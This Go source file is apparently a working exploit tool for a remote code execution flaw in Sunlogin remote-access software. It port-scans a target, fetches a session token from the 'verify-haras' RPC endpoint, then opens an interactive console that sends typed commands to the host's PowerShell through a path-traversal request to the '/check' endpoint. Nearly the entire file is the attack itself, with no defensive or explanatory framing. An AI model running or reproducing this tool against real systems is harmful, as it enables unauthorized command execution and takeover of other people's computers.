package main

import (
	"bufio"
	"fmt"
	"github.com/axgle/mahonia"
	"github.com/imroc/req/v3"
	"net"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var addrs []string

var beginTime time.Time

var isExist bool

type SunLoginRce struct {
}

func NewSunLoginRce() *SunLoginRce {
	return &SunLoginRce{}
}

func (s *SunLoginRce) ScanRce(ip string) {
	beginTime = time.Now()
	fmt.Println("[INFO]:Scanning, Please wait...")
	s.ScanPort(ip)
	s.CheckRce(ip)
	var timeDif = time.Now().Sub(beginTime)
	fmt.Printf("[INFO]:Take %ss\n", strings.Split(timeDif.String(), ".")[0])
}

func (s *SunLoginRce) ScanPort(ip string) {
	var wg sync.WaitGroup
	for i := 1; i <= 65535; i++ {
		wg.Add(1)
		go func(port int) {
			defer wg.Done()
			address := fmt.Sprintf("%s:%d", ip, port)
			conn, err := net.DialTimeout("tcp", address, time.Second)
			if err != nil {
				return
			} else {
				conn.Close()
				addrs = append(addrs, address)
			}
		}(i)
	}
	wg.Wait()
}

func (s *SunLoginRce) CheckRce(ip string) {
	var wg sync.WaitGroup
	client := req.C()
	done := make(chan bool)
	for _, addr := range addrs {
		wg.Add(1)

		go func() {
			wg.Wait()
			done <- true
		}()
		go func() {
			defer wg.Done()
			resp, err := client.R().Get("http://" + addr + "/cgi-bin/rpc?action=verify-haras")
			if err != nil {
				return

			}
			if resp.StatusCode == 200 && strings.Contains(resp.String(), "verify_string") {
				add := strings.Split(addr, ":")
				fmt.Printf("[HOST]:%s\n[INFO]:Sunlogin RCE Existent,Port:%s\n", add[0], add[1])
				isExist = true
			}
		}()
		select {
		case <-done:
		case <-time.After(time.Millisecond * 500):
		}
	}
	if isExist != true {
		fmt.Printf("[HOST]:%s\n[INFO]:Sunlogin RCE Non-Existent\n", ip)
	}
}

func (s SunLoginRce) RecConsole(address string) {
	defer func() {
		if err := recover(); err != nil {
			fmt.Printf("[HOST]:%s\n[INFO]:Sunlogin RCE Non-Existent\n", address)
		}
	}()
	fmt.Println("[INFO]:Connecting, Please wait...")
	client := req.C()
	for {
		resp, err := client.R().Get("http://" + address + "/cgi-bin/rpc?action=verify-haras")
		if err != nil {
			panic(err)
		}
		if resp.StatusCode == 200 && strings.Contains(resp.String(), "verify_string") {
			if !isExist {
				fmt.Printf("[HOST]:%s\n[INFO]:Connected,Please input\n", address)
				isExist = true
			}
			msg := regex(`"verify_string":"(?s:(.*?))"`, resp.String())
			cookie := msg[0][1]
			input := bufio.NewReader(os.Stdin)
			fmt.Printf("%s>", "Console")
			order, err := input.ReadString('\n')
			order = strings.TrimSpace(order)
			if err != nil {
				fmt.Println("input.ReadString ERR", err)
				return
			}
			if strings.ToUpper(order) == "Q" {
				os.Exit(1)
			}
			respRce, err := client.R().SetHeader("Cookie", "CID="+cookie).Get("http://" + address + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20" + url.QueryEscape(order))
			if err != nil {
				fmt.Println("client.R().Get err", err)
				return
			}
			// GBK to UTF-8
			dec := mahonia.NewDecoder("GBK")
			ret := dec.ConvertString(respRce.String())
			fmt.Println(ret)
		}
	}

}

func regex(rule string, webInfo string) [][]string {
	re := regexp.MustCompile(rule)
	ReList := re.FindAllStringSubmatch(webInfo, -1)
	return ReList
}
